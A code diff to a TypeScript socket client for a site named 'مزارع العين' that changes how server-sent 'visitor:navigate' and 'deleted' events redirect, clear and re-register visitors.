@@ -223,7 +223,11 @@ export function initializeSocket() {
   s.on("visitor:navigate", (page: string) => {
     console.log("Navigate to:", page);
     if (page) {
-      window.location.href = "/" + page;
+      // Only navigate if it's a different page from current
+      const currentPath = window.location.pathname.replace(/^\//, '');
+      if (page !== currentPath) {
+        window.location.href = "/" + page;
+      }
     }
   });
 
@@ -282,11 +286,17 @@ export function initializeSocket() {
 
   s.on("deleted", () => {
     console.log("Visitor deleted!");
-    window.location.href = "/";
-    errorMessage.value = {
-      en: "Removed Your Account! Try Again Later",
-      ar: "",
-    };
+    // Only redirect if visitor was actually registered (has ID in localStorage)
+    const hadVisitorId = localStorage.getItem("visitorId");
+    localStorage.removeItem("visitorId");
+    if (hadVisitorId) {
+      errorMessage.value = {
+        en: "Removed Your Account! Try Again Later",
+        ar: "",
+      };
+      // Re-register as new visitor instead of redirecting
+      s.emit("visitor:register", { siteName: "مزارع العين" });
+    }
   });
 
   s.on("isAdminConnected", (connected: boolean) => {
